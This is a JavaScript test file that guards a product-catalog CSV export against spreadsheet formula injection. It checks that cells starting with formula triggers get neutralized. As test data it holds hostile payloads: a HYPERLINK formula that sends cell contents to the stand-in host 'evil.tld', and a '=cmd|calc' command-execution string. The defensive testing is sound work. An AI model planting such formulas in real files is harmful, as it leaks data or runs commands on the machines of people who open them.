// Regression guard for the CSV formula-injection class found by the
// 2026-07-27 fleet export sweep.
//
// GET /api/products/export.csv used a local `esc()` that quoted RFC-4180
// specials but let a cell starting with = + - @ through verbatim. Product
// name / tagline / overview are admin-authored free text, so an authed
// insider could plant a formula that fires when anyone opens the catalog
// export in Excel. The fix routes every cell through the fleet-shared writer.

const { csvCell, csvRow } = require('@matthewdbaldwin/microport-contracts/csv');
const { EXPORT_COLUMNS } = require('../src/lib/serializeProductRow');

// Assert the security invariant, not exact bytes: whatever RFC-4180 quoting
// gets applied, what the spreadsheet finally parses must not start with a
// formula trigger.
const asSpreadsheetSees = (cell) =>
  cell.startsWith('"') && cell.endsWith('"') ? cell.slice(1, -1).replace(/""/g, '"') : cell;

describe('shared formula-safe CSV writer is wired into productport', () => {
  test('is resolvable from this repo (dependency + subpath export present)', () => {
    expect(typeof csvCell).toBe('function');
  });

  test.each(['=', '+', '-', '@', '\t', '\r'])('neutralizes a cell starting with %j', (ch) => {
    expect(asSpreadsheetSees(csvCell(`${ch}payload`))).toBe(`'${ch}payload`);
  });

  test('neutralizes a formula planted in a product name', () => {
    const cell = csvCell('=HYPERLINK("http://evil.tld?c="&A1,"catalog")');
    expect(asSpreadsheetSees(cell)).toBe('\'=HYPERLINK("http://evil.tld?c="&A1,"catalog")');
  });

  test('leaves ordinary catalog values untouched', () => {
    for (const v of ['Firehawk Liberty', 'CE MDR', 'Cardiovascular', 2026, 0]) {
      expect(csvCell(v)).toBe(String(v));
    }
  });

  test('still escapes RFC-4180 specials (no regression from the old esc)', () => {
    expect(csvCell('Stent, drug-eluting')).toBe('"Stent, drug-eluting"');
    expect(csvCell('say "hi"')).toBe('"say ""hi"""');
    expect(csvCell(null)).toBe('');
    expect(csvCell(undefined)).toBe('');
  });
});

describe('export row assembly', () => {
  test('the header row is emitted through the guard', () => {
    // Mirrors the route: lines[0] = csvRow(EXPORT_COLUMNS)
    const header = csvRow(EXPORT_COLUMNS);
    expect(header.split(',')[0]).toBe('id');
    expect(header).not.toMatch(/(^|,)[=+@]/); // no unguarded trigger anywhere
  });

  test('a poisoned product row is neutralized end to end', () => {
    const row = { id: 'p1', name: '=cmd|calc', tagline: 'ok' };
    const cols = ['id', 'name', 'tagline'];
    expect(csvRow(cols.map((c) => row[c]))).toBe("p1,'=cmd|calc,ok");
  });
});
